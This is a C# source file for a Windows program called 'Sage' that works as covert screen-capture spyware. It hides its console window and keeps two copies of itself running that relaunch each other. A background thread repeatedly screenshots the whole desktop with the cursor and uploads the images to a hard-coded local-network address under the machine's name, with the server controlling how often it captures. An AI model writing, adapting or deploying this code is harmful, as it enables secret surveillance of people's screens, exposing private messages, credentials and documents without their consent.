using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Sage
{
    class Program
    {
        static Mutex active = new Mutex(false, "SageScreenCapture");

        static void Main(string[] args)
        {
            var h = Win32.GetConsoleWindow();
            Win32.ShowWindow(h, Win32.SW_HIDE);

            ThreadPool.QueueUserWorkItem(Upload);

            Process backup = null;
            if (args.Length > 0)
            {
                if (int.TryParse(args[0], out int pid))
                {
                    try
                    {
                        backup = Process.GetProcessById(pid);
                    }
                    catch { }
                }
            }

            var cur = Process.GetCurrentProcess();

            while (true)
            {
                if (backup != null)
                    backup.WaitForExit();

                backup = Process.Start(cur.MainModule.FileName, cur.Id.ToString());
            }
        }

        public static void Upload(object state)
        {
            try
            {
                active.WaitOne();
            }
            catch (AbandonedMutexException) { }

            int consecutiveFails = 0;
            for (int cap = 0; cap < 100; ++cap)
            {
                try
                {
                    string m = Environment.MachineName;
                    //var request = HttpWebRequest.Create($"http://localhost:1234/smon/screen/{m}");
                    var request = HttpWebRequest.Create($"http://192.168.1.4/smon/screen/{m}");
                    request.Method = "POST";
                    request.Timeout = 5000;

                    //Rectangle bounds = Screen.GetBounds(Point.Empty);
                    Rectangle bounds = SystemInformation.VirtualScreen;
                    Icon cursor = new Icon(typeof(Program), "pointer.ico");
                    using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                    {
                        using (Graphics g = Graphics.FromImage(bitmap))
                        {
                            g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                            var mptr = Cursor.Position;
                            g.DrawIcon(cursor, mptr.X, mptr.Y);
                        }

                        var reqstr = request.GetRequestStream();
                        bitmap.Save(reqstr, ImageFormat.Png);
                        using (var resp = (HttpWebResponse)request.GetResponse())
                        {
                            int sleepDuration = 0;
                            if (resp.StatusCode == HttpStatusCode.OK)
                            {
                                using (var r = new StreamReader(resp.GetResponseStream()))
                                {
                                    var body = r.ReadToEnd();
                                    if (int.TryParse(body, out int timeout) && timeout >= 0 && timeout < 10000)
                                        sleepDuration = timeout;
                                }
                            }
                            if (resp.StatusCode == HttpStatusCode.Accepted)
                                sleepDuration = 5000;
                            if (resp.StatusCode == HttpStatusCode.NoContent)
                                sleepDuration = 300;

                            Thread.Sleep(sleepDuration);
                        }
                    }

                    consecutiveFails = 0;
                }
                catch//(Exception e)
                {
                    //Console.WriteLine(e);
                    if (consecutiveFails++ > 3)
                        break;

                    GC.Collect();
                    Thread.Sleep(1000);
                }
            }

            var cur = Process.GetCurrentProcess();
            cur.Kill();
        }
    }


    class Win32
    {
        [DllImport("kernel32.dll")]
        static public extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static public extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public const int SW_HIDE = 0;
        public const int SW_SHOW = 5;
    }
}
